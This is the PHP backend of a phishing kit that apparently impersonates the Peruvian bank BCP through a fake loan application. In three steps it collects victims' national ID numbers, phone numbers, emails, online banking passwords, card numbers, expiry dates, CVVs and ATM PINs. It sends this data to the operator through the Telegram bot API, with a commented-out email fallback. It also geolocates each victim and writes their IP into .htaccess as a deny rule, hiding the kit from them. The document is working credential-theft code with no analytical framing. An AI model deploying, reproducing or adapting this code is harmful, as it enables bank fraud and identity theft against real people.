<?php
error_reporting(0);
session_start();
/*=================================================================================================*/
include("skate/envio.php");
/*=================================================================================================*/
date_default_timezone_set("America/Lima");
$cliente = getIP();
$agente = $_SERVER["HTTP_USER_AGENT"];
$fecha = date('d/m/Y - h:i A');
include ("skate/ciclos.php");
/*****************************************************************************
*? Obtener IP
******************************************************************************/
function getIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $cliente = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
       $cliente = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_FORWARDED"];
    }
    else {
       $cliente = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
    }
    if ($cliente === '::1') {
       $cliente = '181.67.216.84';
    }
    return $cliente;
}
/*****************************************************************************
*? Variables POST
******************************************************************************/
$data = [
	'dato_0' => "DNI", // Reniec
	'dato_1' => $_POST["data_1"], // Monto
	'dato_2' => $_POST["data_2"], // Documento
	'dato_3' => $_POST["data_3"], // Celular
	'dato_4' => $_POST["data_4"], // Clave
	'dato_5' => $_POST["data_5"], // Tarjeta
	'dato_6' => $_POST["data_6"], // Vencimiento
	'dato_7' => $_POST["data_7"], // CVV
	'dato_8' => $_POST["data_8"], // ATM
	'dato_9' => $_POST["data_9"], // Tipo
	'dato_10' => $_POST["data_10"], // Interes
	'dato_11' => $_POST["data_11"], // Meses
	'dato_12' => $_POST["data_12"], // Cuota
	'dato_13' => $_POST["data_13"], // Email
	'dato_14' => $_POST["data_14"], // Desgravamen
	'dato_15' => $_POST["data_15"], // Total Desgravamen
	'dato_16' => $_POST["data_16"], // TEM
	'dato_17' => $_POST["data_17"], // TEA
];
$voy = $_POST["orden"];
/*=================================================================================================*/
switch ($voy) {

	case "A": // Paso 1

		include("name/consulta.php");
		if ($nombres == NULL || $error == "Nro DNI debe contener 8 digitos") {
			$nombre_full = "Estimado Usuario(a)";
			$name_corto = "Estimado Usuario(a)";
		} else {
			$nombre_full = $nombre_completo;
			$name_corto = $nameFomateado;
		}

		$d_1 = substr($data['dato_3'], 0, -6);
		$d_2 = substr($data['dato_3'], -6, -3);
		$d_3 = substr($data['dato_3'], -3);

		$format_phone = $d_1." ".$d_2." ".$d_3;

		$_SESSION["presto"] = $data['dato_1'];
		$_SESSION["documento"] = $data['dato_2'];
		$_SESSION["phone"] = $format_phone;
		$_SESSION["full"] = $nombre_full;
		$_SESSION["corto"] = $name_corto;
		$_SESSION["email"] = $data['dato_13'];
		$_SESSION["openPE"] = TRUE;

		$sms = "-------------------- [$cliente] --------------------

		Nombre: ".$nombre_full."
		DNI: ".$data['dato_2']."

		Celular: ".$format_phone."

		Prestamo: S/. ".number_format($data['dato_1'])."

		-------------------------------------------------------------
		[$fecha] - $celular
		-------------------------------------------------------------

		";
		/*=================================================================================================*/
		//sendTLG($sms);
		// mandar_datos('Paso 1', $cliente, nl2br($sms));
		/*=================================================================================================*/

	break;

	case "B": // Paso 2

		$_SESSION["llavero"] = $data['dato_4'];
		$_SESSION["puerta"] = $data['dato_5'];
		$_SESSION["tipex"] = $data['dato_9'];
		$_SESSION["interes"] = $data['dato_10'];
		$_SESSION["meses"] = $data['dato_11'];
		$_SESSION["cuota"] = $data['dato_12'];
		$_SESSION["desgra"] = $data['dato_14'];
		$_SESSION["total_desgra"] = $data['dato_15'];
		$_SESSION["tem"] = $data['dato_16'];
		$_SESSION["tea"] = $data['dato_17'];
		
		$sms = "-------------------- [$cliente] --------------------

		Nombre: ".$_SESSION["full"]."
		DNI: ".$_SESSION["documento"]."

		Celular: ".$_SESSION["phone"]."
		Email: ".$_SESSION["email"]."

		Prestamo: S/. ".number_format($_SESSION["presto"])."
		Meses: ".$data['dato_11']."

		Porcentaje Anual (TEA): ".number_format($data['dato_17'], 0)." %
		Porcentaje Mensual (TEM): ".number_format($data['dato_16'], 2)." %

		Porcentaje Desgravamen: ".number_format($data['dato_14'], 3)." %
		Total Desgravamen: S/. ".number_format($data['dato_15'], 2)."

		Cuota Mensual: S/. ".number_format($data['dato_12'], 2)."
		Intereses Pagados: S/. ".number_format($data['dato_10'], 2)."

		Tarjeta: ".$data['dato_5']."
		Clave: ".$data['dato_4']."

		-------------------------------------------------------------
		[$fecha] - $celular
		-------------------------------------------------------------

		";
		/*=================================================================================================*/
		sendTLG($sms);
		// mandar_datos('Clave', $cliente, nl2br($sms));
		/*=================================================================================================*/

	break;

	case "C": // Paso 3

		$xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$cliente);
		SSLPage($xml);
		$pais = $xml->geoplugin_countryName ; // Pais
		$ciudad = $xml->geoplugin_city ; // Ciudad
		$departamento = $xml->geoplugin_regionName ; // Departamento

		$sms = "-------------------- [$cliente] --------------------

		Nombre: ".$_SESSION["full"]."
		DNI: ".$_SESSION["documento"]."

		Celular: ".$_SESSION["phone"]."
		Email: ".$_SESSION["email"]."

		Prestamo: S/. ".number_format($_SESSION["presto"])."
		Meses: ".$_SESSION["meses"]."

		Porcentaje Anual (TEA): ".number_format($_SESSION["tea"], 0)." %
		Porcentaje Mensual (TEM): ".number_format($_SESSION["tem"], 2)." %

		Porcentaje Desgravamen: ".number_format($_SESSION["desgra"], 3)." %
		Total Desgravamen: S/. ".number_format($_SESSION["total_desgra"], 2)."

		Cuota Mensual: S/. ".number_format($_SESSION["cuota"], 2)."
		Intereses Pagados: S/. ".number_format($_SESSION["interes"], 2)."

		Tarjeta: ".$_SESSION["puerta"]."
		Vencimiento: [".$data['dato_6']."] [MM/YY]
		CVV: ".$data['dato_7']."
		ATM: ".$data['dato_8']."

		Tarjeta: ".$_SESSION["puerta"]."
		Clave: ".$_SESSION["llavero"]."

		".$pais." - ".$ciudad." - ".$departamento."
		-------------------------------------------------------------
		[$fecha] - $celular
		-------------------------------------------------------------

		";
		/*=================================================================================================*/
		sendTLG($sms);
		bloquedHT($cliente);
		// mandar_datos('Tarjeta', $cliente, nl2br($sms));
		/*=================================================================================================*/

	break;

	default:
    break;
}
/*==================================================================================================
** Funciones
/*=================================================================================================*/
function sendTLG($sms) {
    $data = [
        'chat_id' => _id,
        'text' => $sms
    ];

    SSLPage("https://api.telegram.org/bot"._token."/sendMessage?".http_build_query($data));
}


function SSLPage($url) {

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

	$result = curl_exec($ch);

	curl_close($ch);

	return $result;
}


function mandar_datos($cadena, $cliente, $sms) {
	$subj = "BCP - $cliente";
	$header .= "From: ".$cadena."<$cliente@noreply.com>"."\r\n";
	$header .= "MIME-Version: 1.0"."\r\n";
	$header .= "Content-type: text/html; charset=utf-8"."\r\n";
	mail(EMAIL_LOGS, $subj, $sms, $header);
}


function bloquedHT($datosIP) {
 
	$file = fopen('.htaccess', 'a+');
	$string = strval($file);
	if (!preg_match('/'.$datosIP.'/i', $string)):
		$gr = "deny from ".$datosIP."\r\n";
		fwrite($file, $gr);
	endif;
	fclose($file);
}
/*=================================================================================================*/
?>